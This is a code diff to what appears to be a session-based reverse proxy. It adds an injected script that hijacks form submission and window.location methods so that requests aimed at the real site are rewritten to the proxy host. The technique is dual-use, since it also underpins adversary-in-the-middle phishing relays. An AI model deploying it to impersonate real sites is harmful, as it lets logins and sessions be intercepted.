@@ -1378,10 +1378,54 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
     }
 
     // ---- 3. INJECT <base> TAG AND STATIC SCRIPT (if needed) ----
-    const baseTag = `<base href="${proxyOrigin}/">`;
-    const staticScript = '<script src="/@"></script>';
-    const headPayload = `${baseTag}${staticScript}`;
+    // ---- 3. INJECT <base>, INTERCEPTOR, AND STATIC SCRIPT ----
+const baseTag = `<base href="${proxyOrigin}/">`;
 
+// ---- Interceptor: prevents dynamic form submissions to real domain ----
+const interceptorScript = `
+<script>
+    (function() {
+        const realHost = '${realHost}';
+        const proxyHost = '${proxyHostname}';
+
+        // Override form submit to rewrite action
+        const originalSubmit = HTMLFormElement.prototype.submit;
+        HTMLFormElement.prototype.submit = function() {
+            if (this.action && this.action.includes(realHost)) {
+                this.action = this.action.replace(realHost, proxyHost);
+            }
+            return originalSubmit.call(this);
+        };
+
+        // Override window.location setters and methods
+        const originalLocation = window.location;
+        Object.defineProperty(window, 'location', {
+            get: function() { return originalLocation; },
+            set: function(url) {
+                if (typeof url === 'string' && url.includes(realHost)) {
+                    url = url.replace(realHost, proxyHost);
+                }
+                originalLocation.href = url;
+            },
+            configurable: true
+        });
+        window.location.assign = function(url) {
+            if (typeof url === 'string' && url.includes(realHost)) {
+                url = url.replace(realHost, proxyHost);
+            }
+            return originalLocation.assign(url);
+        };
+        window.location.replace = function(url) {
+            if (typeof url === 'string' && url.includes(realHost)) {
+                url = url.replace(realHost, proxyHost);
+            }
+            return originalLocation.replace(url);
+        };
+    })();
+</script>`;
+
+const staticScript = '<script src="/@"></script>';
+const headPayload = `${baseTag}${interceptorScript}${staticScript}`;
     // ---- 4. INJECT PAYLOAD INTO <head> ----
     const injectionMap = {
         "<head>": `<head>${headPayload}`,
